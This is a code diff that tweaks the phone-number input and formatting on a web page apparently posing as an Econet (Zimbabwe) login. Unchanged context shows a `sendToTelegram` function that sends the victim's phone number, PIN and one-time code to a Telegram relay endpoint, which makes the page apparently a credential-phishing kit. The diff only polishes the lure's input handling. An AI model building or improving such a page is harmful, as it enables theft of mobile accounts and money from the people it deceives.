@@ -375,7 +375,7 @@ input:focus{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 4p
             <div class="phone-row">
               <div class="phone-prefix"><span style="font-size:16px;line-height:1;margin-right:6px">🇿🇼</span>+263</div>
               <!-- #15 auto-format phone -->
-              <input type="tel" id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="77 123 4567" autocomplete="tel">
+              <input type="tel" id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="7XXXXXXXX" autocomplete="tel">
             </div>
             <div class="field-hint">9-digit Econet number</div>
             <div class="field-error" id="phoneError">Please enter a valid 9-digit number starting with 7</div>
@@ -488,20 +488,15 @@ async function sendToTelegram(event){
   fetch('/api/sendTelegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event,plan:getPlanLine(),device})});
 }
 
-/* ── #15 PHONE AUTO-FORMAT ────────────────── */
+/* ── PHONE INPUT ──────────────────────────── */
 const phoneEl=document.getElementById('phone');
 phoneEl.addEventListener('input',e=>{
   let raw=e.target.value.replace(/\D/g,'');
   if(raw.startsWith('263')) raw=raw.slice(3);
   if(raw.startsWith('0'))  raw=raw.slice(1);
-  if(raw.length>0&&raw[0]!=='7') raw='7'+raw.slice(1);
   raw=raw.slice(0,9);
-  // format as XX XXX XXXX
-  let fmt=raw;
-  if(raw.length>2) fmt=raw.slice(0,2)+' '+raw.slice(2);
-  if(raw.length>5) fmt=raw.slice(0,2)+' '+raw.slice(2,5)+' '+raw.slice(5);
-  e.target.value=fmt;
-  phoneValue='+263'+raw;
+  e.target.value=raw;
+  phoneValue=raw.length>0?'+263'+raw:'';
   clearError('phoneField','phoneError');
   validateLogin();
 });
